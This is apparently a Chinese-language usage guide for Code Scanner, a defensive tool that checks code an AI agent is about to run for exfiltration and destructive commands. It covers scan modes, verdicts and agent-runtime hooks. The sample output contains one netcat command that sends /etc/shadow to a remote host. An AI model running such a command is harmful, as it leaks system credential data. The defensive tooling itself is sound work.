---
sources:
  - design/code_scanner
---

# Code Scanner 使用指南

## 功能概述

Code Scanner 对 AI Agent 即将执行的代码进行安全扫描，检测数据外泄、破坏性操作、恶意代码执行等威胁。支持 Bash 和 Python 语言，提供正则规则引擎和 LLM 语义引擎两种扫描模式。

## 使用方式

### CLI 命令

```bash
agent-sec-cli scan-code --code '<source_code>' --language bash --mode regex
```

**参数说明：**

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `--code` | 待扫描的源代码（必填） | — |
| `--language` | 代码语言：`bash` / `python` | `bash` |
| `--mode` | 扫描引擎：`regex` / `llm` | `regex` |

### 输出格式

JSON 格式输出，核心字段：

```json
{
  "ok": true,
  "verdict": "pass|warn|deny|error",
  "summary": "No issues found in bash code",
  "findings": [
    {
      "rule_id": "bash-data-exfil-nc",
      "severity": "deny",
      "desc_zh": "...",
      "desc_en": "...",
      "evidence": ["nc 192.168.1.1 4444 < /etc/shadow"]
    }
  ],
  "language": "bash",
  "elapsed_ms": 12
}
```

### Verdict 含义

| Verdict | 含义 | 建议动作 |
|---------|------|---------|
| `pass` | 未发现安全问题 | 放行 |
| `warn` | 存在可疑行为 | 告警并放行 |
| `deny` | 确认存在安全威胁 | 拦截 |
| `error` | 扫描异常 | 按策略决定（fail-open/fail-close） |

## 扫描模式

### Regex 模式（默认）

- 使用预定义 YAML 规则文件进行正则匹配
- 优点：确定性、低延迟（<50ms）、离线可用
- 当前规则覆盖：Bash 27 条、Python 10 条
- 支持 Bash 中嵌套 Python 代码的自动提取和扫描

### LLM 模式

- 使用本地 Ollama 模型进行语义判定
- 优点：覆盖正则无法表达的复杂场景
- 配置模型：环境变量 `AGENT_SEC_OLLAMA_MODEL`（默认 `warden`）
- 前提：本地 Ollama 服务运行中且模型已部署

## Hook 集成

Code Scanner 在各 Agent 运行时中通过 hook 自动触发：

| 运行时 | Hook 点 | Matcher |
|--------|---------|---------|
| Cosh | PreToolUse | `^(run_shell_command\|shell)$` |
| Hermes | PreToolUse | Bash 类工具 |
| OpenClaw | before_tool_call | Bash 类工具 |
| Codex | PreToolUse | Bash |

## 透出模式配置

通过环境变量控制检测结果的处理方式：

```bash
export CODE_SCANNER_MODE=deny  # deny: 拦截; observe: 仅记录（默认）
```
